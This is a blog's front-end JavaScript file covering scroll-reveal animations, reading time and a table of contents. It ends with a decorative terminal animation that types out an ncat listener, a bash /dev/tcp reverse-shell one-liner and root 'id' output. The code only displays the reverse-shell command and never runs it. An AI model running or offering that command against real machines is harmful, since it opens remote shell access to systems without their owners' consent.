// === Razor Blog JS (unified engine) ===

// Reveal engine (single IntersectionObserver) + helpers
(function(){
  const observed = new Set();
  const io = new IntersectionObserver((entries)=>{ entries.forEach(e=>{ if(e.isIntersecting){ e.target.classList.add('is-in'); io.unobserve(e.target); } }); }, { threshold: .01, rootMargin: "0px 0px -35% 0px" });

  function addReveal(els, stagger=0){
    els.forEach((el, i)=>{
      if(!el.classList.contains('reveal')) el.classList.add('reveal');
      if(stagger) el.style.transitionDelay = (i*stagger)+'ms';
      if(!observed.has(el)){ io.observe(el); observed.add(el); }
    });
  }

  // Initial reveal targets already in DOM
  addReveal(Array.from(document.querySelectorAll('.reveal')));

  // Index grid: staggered cards
  const gridCards = Array.from(document.querySelectorAll('.grid .card'));
  if(gridCards.length) addReveal(gridCards, 24); // fast

  // Post utilities: reading time + dynamic ToC + reveal of blocks
  (function(){
    const container = document.querySelector('.post .post-body');
    if(!container) return;

    // Reading time
    const words = container.textContent.trim().split(/\s+/).length;
    const rt = document.querySelector('[data-reading-time]');
    if(rt){ rt.textContent = Math.max(1, Math.round(words/220)) + ' min'; }

    // ToC
    const tocRoot = document.querySelector('.toc ul');
    if(tocRoot){
      tocRoot.innerHTML = "";
      const headings = container.querySelectorAll('h2, h3');
      headings.forEach((h, idx)=>{
        if(!h.id){ h.id = (h.textContent.trim().toLowerCase().replace(/[^\w]+/g,'-') || 'sec') + '-' + idx; }
        const li = document.createElement('li');
        li.className = 'level-' + h.tagName.toLowerCase();
        const a = document.createElement('a');
        a.href = '#' + h.id;
        a.textContent = h.textContent;
        li.appendChild(a);
        tocRoot.appendChild(li);
      });
    }

    // Reveal post blocks with small stagger (fast)
    const blocks = Array.from(container.children);
    addReveal(blocks, 12);
  })();

  // Hero terminals typing: reverse shell then `id`
  (function(){
    const A = document.querySelector('[data-ty="a"]'); // attacker
    const B = document.querySelector('[data-ty="b"]'); // victim
    if(!A || !B) return;

    const attackerSeq = [
      "ncat -lvnp 4444",
      "listening on [any] 4444 ...",
      "connection received from 10.10.10.42",
      "id",
      "uid=0(root) gid=0(root) groups=0(root)"
    ];
    const victimSeq = [
      "bash -i >& /dev/tcp/10.10.10.10/4444 0>&1"
    ];

    function typeLine(el, str, delay){
      return new Promise(resolve => {
        let i = 0;
        (function step(){
          if(i < str.length){
            el.textContent += str.charAt(i++);
            setTimeout(step, delay);
          } else {
            el.textContent += "\n";
            resolve();
          }
        })();
      });
    }

    async function run(){
      A.textContent = "";
      B.textContent = "";
      await typeLine(A, attackerSeq[0], 14);
      await typeLine(A, attackerSeq[1], 10);
      await typeLine(B, victimSeq[0], 12);
      await typeLine(A, attackerSeq[2], 12);
      await typeLine(A, attackerSeq[3], 14);
      await typeLine(A, attackerSeq[4], 10);
    }

    const grid = document.querySelector('.term-grid');
    let played = false;
    const ioHero = new IntersectionObserver((entries)=>{ entries.forEach(e=>{ if(e.isIntersecting && !played){ played = true; run(); ioHero.unobserve(e.target); } }); }, { threshold: .01, rootMargin: "0px 0px -35% 0px" });
    if(grid) ioHero.observe(grid); else run();
  })();
})();
